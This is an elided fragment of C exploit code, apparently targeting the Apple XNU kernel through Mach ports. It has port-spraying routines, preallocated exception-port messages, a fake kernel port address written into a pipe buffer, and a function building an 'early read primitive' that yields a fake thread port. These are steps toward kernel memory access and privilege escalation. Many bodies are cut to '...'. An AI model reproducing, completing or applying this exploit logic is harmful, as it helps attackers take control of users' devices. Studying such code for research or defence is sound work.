...
mach_port_t ian_prealloc_port(natural_t size) {
    kern_return_t err;
...
void ian_prepare_prealloc_port(mach_port_t port) {
    mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
}

int ian_port_has_message(mach_port_t port) {
    kern_return_t err;
...
void ian_send_prealloc_msg(mach_port_t port) {
    // start a new thread passing it the buffer and the exception port
    pthread_t t;
    pthread_create(&t, NULL, ian_do_thread, (void*)port);
    ...
    while(!ian_port_has_message(port)){;}
...
mach_port_t ian_receive_prealloc_msg(mach_port_t port) {
...
mach_port_t prepare_early_read_primitive(uint64_t pipe_buffer_kaddr, int pipe_read_end, int pipe_write_end, mach_port_t replacer_port, uint8_t* original_contents) {
    ...
    *((uint64_t*)(original_contents+0x66c)) = fake_port_kaddr;
    ...
    early_read_port = ian_receive_prealloc_msg(replacer_port);
...
void brewbeer() {
    ...
    for (int i = 0; i < 100; i++) {
        mach_port_t p = ian_prealloc_port(0x800);
        ian_prepare_prealloc_port(p);
        exception_ports[i] = p;
        usleep(10000);
    }
    ...
    for (int i = 0; i < 100; i++) {
        ian_send_prealloc_msg(exception_ports[i]);
        ...
        if (memcmp(original_contents, new_contents, PIPE_SIZE) == 0) {
            ...
            mach_port_t fake_thread_port = ian_receive_prealloc_msg(exception_ports[i]);
